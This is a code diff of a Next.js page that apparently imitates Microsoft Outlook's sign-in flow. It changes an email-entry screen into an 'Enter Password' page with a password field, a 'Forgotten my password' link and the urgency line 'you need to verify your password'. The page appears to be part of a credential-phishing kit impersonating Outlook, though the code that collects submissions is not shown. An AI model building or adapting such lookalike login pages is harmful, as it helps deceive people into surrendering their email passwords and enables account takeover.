@@ -1,82 +1,82 @@
 import Head from "next/head";
 import Image from "next/image";
-import styles from "../styles/Index.module.css";
+import styles from "../styles/Password.module.css";
 
-export default function Home() {
+export default function Password() {
   return (
     <div className={styles.container}>
       <Head>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Sign in your account</title>
-
+        <link rel="stylesheet" href="styles.css" />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="57x57"
-          href="../password/assets/favicomatic/"
+          href="assets/favicomatic/"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="114x114"
-          href="../password/assets/favicomatic/apple-touch-icon-114x114.png"
+          href="assets/favicomatic/apple-touch-icon-114x114.png"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="72x72"
-          href="../password/assets/favicomatic/apple-touch-icon-72x72.png"
+          href="assets/favicomatic/apple-touch-icon-72x72.png"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="144x144"
-          href="../password/assets/favicomatic/apple-touch-icon-144x144.png"
+          href="assets/favicomatic/apple-touch-icon-144x144.png"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="60x60"
-          href="../password/assets/favicomatic/apple-touch-icon-60x60.png"
+          href="assets/favicomatic/apple-touch-icon-60x60.png"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="120x120"
-          href="../password/assets/favicomatic/apple-touch-icon-120x120.png"
+          href="assets/favicomatic/apple-touch-icon-120x120.png"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="76x76"
-          href="../password/assets/favicomatic/apple-touch-icon-76x76.png"
+          href="assets/favicomatic/apple-touch-icon-76x76.png"
         />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="152x152"
-          href="../password/assets/favicomatic/apple-touch-icon-152x152.png"
+          href="assets/favicomatic/apple-touch-icon-152x152.png"
         />
         <link
           rel="icon"
           type="image/png"
-          href="../password/assets/favicomatic/favicon-196x196.png"
+          href="assets/favicomatic/favicon-196x196.png"
           sizes="196x196"
         />
         <link
           rel="icon"
           type="image/png"
-          href="../password/assets/favicomatic/favicon-96x96.png"
+          href="assets/favicomatic/favicon-96x96.png"
           sizes="96x96"
         />
         <link
           rel="icon"
           type="image/png"
-          href="../password/assets/favicomatic/favicon-32x32.png"
+          href="assets/favicomatic/favicon-32x32.png"
           sizes="32x32"
         />
         <link
           rel="icon"
           type="image/png"
-          href="../password/assets/favicomatic/favicon-16x16.png"
+          href="assets/favicomatic/favicon-16x16.png"
           sizes="16x16"
         />
         <link
           rel="icon"
           type="image/png"
-          href="../password/assets/favicomatic/favicon-128.png"
+          href="assets/favicomatic/favicon-128.png"
           sizes="128x128"
         />
         <meta name="application-name" content="&nbsp;" />
@@ -95,6 +95,7 @@ export default function Home() {
           name="msapplication-square310x310logo"
           content="mstile-310x310.png"
         />
+
         <link
           rel="stylesheet"
           href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
@@ -102,31 +103,38 @@ export default function Home() {
       </Head>
 
       <main className={`${styles.flow} ${styles.main}`}>
-        <h1 className={styles.h1}>Outlook</h1>
         <img
-          src="../password/assets/logo.png"
+          src="assets/logo.png"
           alt=""
           aria-hidden="true"
           className={styles.img}
         />
-        <h2 className={styles.h2}>Sign in</h2>
-        <p className={styles.p}>to continue to Outlook</p>
+        <p className={styles.p}>
+          <a href="" className={styles.a}>
+            <i className={`${styles.i} fa-solid fa-arrow-left`}></i>
+            @froggy959.net
+          </a>
+        </p>
+        <h1 className={styles.h1}>Enter Password</h1>
         <p className={styles.p}>
           Because you're accessing sensitive info, you need to verify your
-          account
+          password
         </p>
         <form
           action=""
           method="POST"
-          className={`${styles.flow} ${styles.form}`}
+          className={`${styles.form} ${styles.flow}`}
         >
           <input
-            type="text"
-            name="account"
-            placeholder="Email, phone, or Skype"
+            type="password"
+            name="password"
+            placeholder="Password"
             className={styles.input}
           />
-          <input type="submit" value="Next" className={styles.input} />
+          <a href="" className={styles.a}>
+            Forgotten my password
+          </a>
+          <input type="submit" value="Sign in" className={styles.input} />
         </form>
       </main>
       <nav className={styles.nav}>
